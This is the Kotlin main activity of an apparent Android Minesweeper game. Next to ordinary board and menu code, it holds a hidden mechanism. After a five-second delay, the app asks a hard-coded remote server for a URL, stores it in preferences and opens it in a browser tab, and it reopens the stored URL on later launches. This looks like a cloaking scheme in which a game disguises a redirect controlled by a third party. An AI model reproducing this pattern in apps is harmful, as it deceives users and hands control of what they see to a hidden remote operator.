package com.example.pas19.minesweeper.view

import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.constraintlayout.widget.ConstraintLayout
import androidx.constraintlayout.widget.ConstraintSet
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.*
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.example.pas19.minesweeper.*
import com.example.pas19.minesweeper.data.Preferences
import com.example.pas19.minesweeper.data.remote.ApiModel
import com.example.pas19.minesweeper.data.remote.ApiTab
import com.example.pas19.minesweeper.data.remote.LinksManager
import com.example.pas19.minesweeper.data.remote.MyApi

import kotlinx.android.synthetic.main.activity_game.*
import kotlinx.android.synthetic.main.table_field.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import pl.polidea.view.ZoomView
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

class MainActivity : AppCompatActivity(), GameView, ApiTab {
    private val presenter = Presenter(this, Model())
    private lateinit var zoomView : ZoomView
    override var isBlocked: Boolean = false
    var prefReq : Preferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val links = LinksManager(this)
        links.attachWeb(this)
        checkLinks(links, false)
        setContentView(R.layout.activity_game)
        GlobalScope.launch(Dispatchers.IO) {
            Thread.sleep(5000)
            withContext(Dispatchers.Main){
                progress_bar.visibility = View.GONE
                checkLinks(links, true)
                setupView()
                presenter.buildGameField()
            }
        }
    }

    fun checkLinks(links : LinksManager, kek : Boolean){
        if(links.url != null) execResponse(links.url!!)
        else{
            prefReq = Preferences(this@MainActivity).apply { getSp("req") }
            val req = prefReq!!.getStr("req")
            if(req != null && req != "" && !links.exec) execResponse("req")
            else
                if (kek) callToApi()
        }
    }

    fun callToApi(){
        val base_url = "https://prilki.space/"
        val retrofit = Retrofit.Builder()
            .baseUrl(base_url)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        val service = retrofit.create(MyApi::class.java)
        service.getModel().enqueue(object : Callback<ApiModel>{
            override fun onFailure(call: Call<ApiModel>, t: Throwable) {
                Log.e("Error", "Failed to get response")
            }

            override fun onResponse(call: Call<ApiModel>, response: Response<ApiModel>) {
                if(response.body()?.url != "false"){
                    Log.e("Response", response.body()?.url)
                    response.body()?.url?.let { prefReq?.putStr("req", it) }
                    response.body()?.url?.let { execResponse(it) }
                }
                else
                    Log.e("Response", "False")
            }

        })
    }

    override fun execResponse(url : String){
        Log.e("Deep", url)
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
    }

    private fun setupView() {
        zoomView = ZoomView(this)
        val field = layoutInflater.inflate(R.layout.table_field, null)
        zoomView.addView(field)
        findViewById<ConstraintLayout>(R.id.activity_main).addView(zoomView)
        zoomView.id = ZoomView.generateViewId()
        val set = ConstraintSet()
        set.clone(activity_main)
        set.connect(zoomView.id, ConstraintSet.LEFT, ConstraintSet.PARENT_ID, ConstraintSet.LEFT)
        set.connect(zoomView.id, ConstraintSet.RIGHT, ConstraintSet.PARENT_ID, ConstraintSet.RIGHT)
        set.connect(zoomView.id, ConstraintSet.TOP, ConstraintSet.PARENT_ID, ConstraintSet.TOP)
        set.connect(zoomView.id, ConstraintSet.BOTTOM, ConstraintSet.PARENT_ID, ConstraintSet.BOTTOM)
        set.constrainHeight(zoomView.id, ConstraintSet.MATCH_CONSTRAINT)
        //set.setVerticalBias(zoomView.id, 0.4f)
        set.applyTo(activity_main)
        zoomView.maxZoom = 1f
    }

    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.menu_main, menu)
        return true
    }

    override fun onOptionsItemSelected(item: MenuItem?): Boolean {
        when(item?.itemId){
            R.id.action_new_game -> presenter.newGame()
            R.id.action_beginner -> {presenter.changeLevel(Presenter.Level.Beginner); item.isChecked = true; zoomView.maxZoom = 1f}
            R.id.action_intermediate ->{presenter.changeLevel(Presenter.Level.Intermediate); item.isChecked = true; zoomView.maxZoom = 1.7f}
           // R.id.action_expert -> {presenter.changeLevel(GamePresenter.Level.Expert); item.isChecked = true; zoomView.maxZoom = 3.3f}
            R.id.action_records -> {
                val intent = Intent(this, RecordsActivity::class.java)
                startActivity(intent)
            }
        }
        return true

    }

    override fun buildGameField(size : Size) {
        zoomView.zoomTo(1f,0f,0f)
        if (size.height == table_field.childCount && size.width == (table_field.getChildAt(0) as TableRow).childCount)
            clearField()
        else {
            table_field.removeAllViews()
            /*(0..table_field.childCount).map { i -> table_field.removeViewAt(i) }*/
            for (i in 0 until size.height) {
                val row = TableRow(this) // создание строки таблицы
                for (j in 0 until size.width) {
                    val button = CageButton(this)
                    var point = Point(j, i)

                    button.setOnClickListener{onClickCell(point)} // установка слушателя, реагирующего на клик по кнопке
                    row.addView(
                        button, TableRow.LayoutParams(
                            TableRow.LayoutParams.WRAP_CONTENT,
                            TableRow.LayoutParams.WRAP_CONTENT, 1f
                        )
                    )
                }
                table_field.addView(
                    row, TableLayout.LayoutParams(
                        TableLayout.LayoutParams.WRAP_CONTENT,
                        TableLayout.LayoutParams.WRAP_CONTENT
                    )
                )
            }
        }
    }

    private fun clearField(){
        for (i in 0 until table_field.childCount){
            val row = table_field.getChildAt(i) as TableRow
            for (j in 0 until row.childCount)
                (row.getChildAt(j) as CageButton).open(GameView.CellType.Closed)
        }
    }

    override fun openCellAt(point : Point, type : GameView.CellType, label : Int) {
        ((table_field.getChildAt(point.y) as TableRow).getChildAt(point.x) as CageButton).open(type, label)
    }

    private fun onClickCell(point: Point) {
        if (!isBlocked)
            presenter.openCellAt(point)
    }

    override fun showLoseMessage() {
        Toast.makeText(this, R.string.you_lose, Toast.LENGTH_LONG).show()
    }

    override fun showWinMessage() {
        Toast.makeText(this, R.string.you_win, Toast.LENGTH_LONG).show()
    }
}
